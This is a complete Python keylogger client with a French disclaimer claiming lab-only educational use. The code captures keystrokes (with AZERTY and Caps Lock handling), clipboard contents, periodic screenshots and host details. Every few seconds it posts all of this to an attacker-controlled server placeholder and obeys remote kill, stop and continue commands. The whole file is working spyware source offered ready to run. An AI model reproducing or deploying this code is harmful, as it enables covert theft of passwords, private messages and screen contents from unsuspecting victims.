"""
LG WS KEYLOGGER - CLIENT (VICTIME)
----------------------------------------------------
ATTENTION : Ce logiciel est conçu uniquement à des fins pédagogiques 
dans le cadre d'un laboratoire d'étude en cybersécurité.
"""

import threading
import time
import platform
import socket
import uuid
import base64
import requests
import pyperclip
from pynput import keyboard
from PIL import ImageGrab
from datetime import datetime
from io import BytesIO

# --- CONFIGURATION ---
SERVER_URL = "http://[IP_MACHINE_ATTAQUANTE]:5000/api/data"
SEND_INTERVAL = 3
SCREENSHOT_INTERVAL = 30 

class LG_WS_Keylogger:
    def __init__(self):
        self.uuid = str(uuid.uuid4())
        self.log_buffer = ""
        self.is_running = True
        self.is_paused = False
        self.lock = threading.Lock()
        self.last_clipboard = ""
        self.system_info = self.get_system_info()
        
        # --- NOUVEAU : Gestion des états clavier ---
        self.caps_lock_on = False  # État du Verrou Maj
        self.alt_gr_pressed = False # État de la touche AltGr

    def get_ip_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 1))
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    def get_system_info(self):
        return {
            "os": platform.system(),
            "hostname": socket.gethostname(),
            "ip_address": self.get_ip_address(),
            "uuid": self.uuid,
            "agent_version": "LG WS v1.2 (Azerty Fix)"
        }

    def process_key_azerty(self, key):
        """Logique personnalisée pour gérer AZERTY et CAPS LOCK"""
        try:
            # 1. Gestion des caractères spéciaux (Espace, Entrée...)
            if key == keyboard.Key.space: return " "
            if key == keyboard.Key.enter: return "\n"
            if key == keyboard.Key.backspace: return "[DEL]"
            if key == keyboard.Key.tab: return "\t"
            
            # Si c'est un caractère imprimable
            if hasattr(key, 'char') and key.char is not None:
                char = key.char

                # 2. CORRECTION @ (AltGr + à)
                # Sur AZERTY, la touche 'à' (0) avec AltGr doit donner '@'
                if self.alt_gr_pressed:
                    if char == 'à' or char == '0': 
                        return "@"
                    if char == 'e': return "€"
                    # On peut ajouter d'autres mappings ici si besoin ({ [ | etc)

                # 3. CORRECTION CAPS LOCK
                # Si c'est une lettre minuscule et que CapsLock est ON -> Majuscule
                if self.caps_lock_on and char.isalpha():
                    return char.upper()
                
                # Si CapsLock est OFF mais Shift est maintenu, pynput le gère généralement seul
                # mais au cas où, on laisse le char tel quel (pynput renvoie souvent déjà la majuscule avec Shift)
                return char

            return ""
        except:
            return ""

    def on_press(self, key):
        if self.is_paused: return

        # Détection des modificateurs
        if key == keyboard.Key.caps_lock:
            self.caps_lock_on = not self.caps_lock_on # Bascule ON/OFF
            # On ne log pas la touche caps lock elle-même
            return

        if key == keyboard.Key.alt_gr:
            self.alt_gr_pressed = True
            return

        # Traitement du caractère
        clean_char = self.process_key_azerty(key)
        if clean_char:
            with self.lock:
                self.log_buffer += clean_char

    def on_release(self, key):
        # Important : Détecter quand on relâche AltGr
        if key == keyboard.Key.alt_gr:
            self.alt_gr_pressed = False

    def monitor_clipboard(self):
        while self.is_running:
            if not self.is_paused:
                try:
                    current_content = pyperclip.paste()
                    if current_content and current_content != self.last_clipboard:
                        self.last_clipboard = current_content
                        ts = datetime.now().strftime("%H:%M:%S")
                        with self.lock:
                            self.log_buffer += f"\n--- [CLIPBOARD {ts}] ---\n{current_content}\n-----------------------------\n"
                except: pass
            time.sleep(1)

    def capture_screenshot(self):
        if self.is_paused: return None
        try:
            screenshot = ImageGrab.grab()
            buffered = BytesIO()
            screenshot.save(buffered, format="JPEG", quality=40)
            return base64.b64encode(buffered.getvalue()).decode()
        except: return None

    def send_heartbeat(self):
        data = {
            "uuid": self.uuid, "timestamp": str(datetime.now()),
            "type": "heartbeat", "system_info": self.system_info,
            "keystrokes": "", "screenshot": None
        }

        if not self.is_paused:
            with self.lock:
                if self.log_buffer:
                    data["keystrokes"] = self.log_buffer
                    data["type"] = "log_update"
                    self.log_buffer = ""

        try:
            res = requests.post(SERVER_URL, json=data, timeout=3)
            if res.status_code == 200:
                self.handle_command(res.json().get("command"))
        except: pass

    def handle_command(self, cmd):
        if cmd == "kill": self.is_running = False
        elif cmd == "stop" and not self.is_paused: self.is_paused = True
        elif cmd == "continue" and self.is_paused: self.is_paused = False

    def main_loop(self):
        print(f"[*] LG WS KEYLOGGER (Azerty) - UUID: {self.uuid}")
        last_screen = 0
        while self.is_running:
            if not self.is_paused and (time.time() - last_screen > SCREENSHOT_INTERVAL):
                scr = self.capture_screenshot()
                if scr:
                    try: requests.post(SERVER_URL, json={"uuid": self.uuid, "type": "screen", "screenshot": scr})
                    except: pass
                last_screen = time.time()
            self.send_heartbeat()
            time.sleep(SEND_INTERVAL)

    def start(self):
        # Ajout de on_release pour gérer le relâchement de AltGr
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()
        threading.Thread(target=self.monitor_clipboard, daemon=True).start()
        try: self.main_loop()
        except KeyboardInterrupt: listener.stop()

if __name__ == "__main__":
    LG_WS_Keylogger().start()
